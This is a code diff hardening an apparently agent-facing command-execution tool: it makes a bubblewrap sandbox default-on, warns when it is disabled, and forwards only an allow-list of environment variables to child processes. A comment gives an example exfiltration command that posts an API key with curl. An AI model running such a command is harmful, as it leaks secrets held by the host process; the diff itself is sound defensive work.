@@ -24,11 +24,20 @@
 //                              isolation. No net isolation by default
 //                              (operators who want it set
 //                              IMHUB_EXEC_SANDBOX_NET=off).
-//   IMHUB_EXEC_SANDBOX=off | unset → plain spawn, no isolation.
+//   Default (v1.3.7, F2): when /usr/bin/bwrap exists the sandbox is ON
+//                         automatically. The danger-pattern denylist is a
+//                         tripwire, not a boundary — the real isolation is
+//                         the bwrap namespace, so it must not be opt-in.
+//   IMHUB_EXEC_SANDBOX=off → plain spawn, no isolation (warns loudly when
+//                            bwrap is installed but disabled).
+//   When bwrap is NOT installed → plain spawn (no isolation available).
 //
 // Other env knobs:
 //   IMHUB_EXEC_TIMEOUT_MS    default 60_000, hard cap 600_000
 //   IMHUB_EXEC_MAX_OUTPUT    default 32_768 bytes per stream
+//   IMHUB_EXEC_ENV_PASS      comma-separated extra env keys to forward to
+//                            the child (v1.3.7, F1 — default is a small
+//                            safe allow-list, NOT the whole process.env)
 
 import { spawn } from 'node:child_process'
 import { existsSync } from 'node:fs'
@@ -141,7 +150,13 @@ async function runExec(args: Record<string, unknown>, ctx: ExecContext, signal: 
   const cwd = typeof args.cwd === 'string' && args.cwd.length > 0 ? args.cwd : ctx.cwd
 
   const sandboxMode = (process.env.IMHUB_EXEC_SANDBOX || '').toLowerCase()
-  const sandboxConfigured = sandboxMode === 'bwrap' && existsSync('/usr/bin/bwrap')
+  const bwrapAvail = existsSync('/usr/bin/bwrap')
+  // v1.3.7 (F2) — default-on: enable the sandbox whenever bwrap is present
+  // unless the operator explicitly opts out with IMHUB_EXEC_SANDBOX=off.
+  // Previously this was opt-in (=== 'bwrap'), which left every default
+  // deployment running native_exec unconfined despite bwrap being available.
+  const sandboxConfigured = bwrapAvail && sandboxMode !== 'off'
+  if (bwrapAvail && sandboxMode === 'off') warnSandboxDisabledOnce()
   const sandboxNetOff = (process.env.IMHUB_EXEC_SANDBOX_NET || '').toLowerCase() === 'off'
 
   // v1.2.93 — sandbox carve-out for the bgjob long-task wrapper. bgjob
@@ -227,6 +242,39 @@ function checkDangerousCommand(cmd: string): string | null {
     if (p.regex.test(cmd)) return p.reason
   }
   return null
+}
+
+// v1.3.7 (F2) — one-shot loud warning when bwrap is installed but the
+// operator has explicitly disabled the sandbox. Without this, "off" is a
+// silent, dangerous downgrade of the only real exec boundary.
+let _warnedSandboxOff = false
+function warnSandboxDisabledOnce(): void {
+  if (_warnedSandboxOff) return
+  _warnedSandboxOff = true
+  log.warn({ event: 'exec.sandbox.disabled_despite_bwrap' },
+    'IMHUB_EXEC_SANDBOX=off: bubblewrap is installed but the native_exec sandbox is disabled — commands run unconfined on the host')
+}
+
+// v1.3.7 (F1) — env allow-list. The child previously inherited the FULL
+// process.env, so any native_exec command could read every secret the
+// agent process holds (*_API_KEY, DB_PASSWORD, SSH_*, …) and exfil it
+// straight past the SSRF guards (e.g. `curl -d "$OPENAI_API_KEY" url`).
+// We now forward only a small safe base set, the per-spawn RPC injection
+// (extraEnv), and any keys the operator opts into via IMHUB_EXEC_ENV_PASS.
+const SAFE_ENV_KEYS = [
+  'PATH', 'HOME', 'LANG', 'LC_ALL', 'LC_CTYPE', 'USER', 'LOGNAME',
+  'TMP', 'TMPDIR', 'TEMP', 'TERM', 'SHELL', 'TZ', 'PWD',
+] as const
+
+export function buildExecEnv(extraEnv?: NodeJS.ProcessEnv): NodeJS.ProcessEnv {
+  const passExtra = (process.env.IMHUB_EXEC_ENV_PASS || '')
+    .split(',').map((s) => s.trim()).filter(Boolean)
+  const base: NodeJS.ProcessEnv = {}
+  for (const k of [...SAFE_ENV_KEYS, ...passExtra]) {
+    const v = process.env[k]
+    if (v != null) base[k] = v
+  }
+  return extraEnv ? { ...base, ...extraEnv } : base
 }
 
 /**
@@ -353,7 +401,7 @@ function runChild(bin: string, argv: string[], opts: RunOpts): Promise<Dispatche
     let stderrTruncated = false
     let timedOut = false
 
-    const env = opts.extraEnv ? { ...process.env, ...opts.extraEnv } : process.env
+    const env = buildExecEnv(opts.extraEnv)  // v1.3.7 (F1) — allow-list, not full process.env
     const child = spawn(bin, argv, { cwd: opts.cwd, env, signal: opts.signal })
     const timer = setTimeout(() => {
       timedOut = true
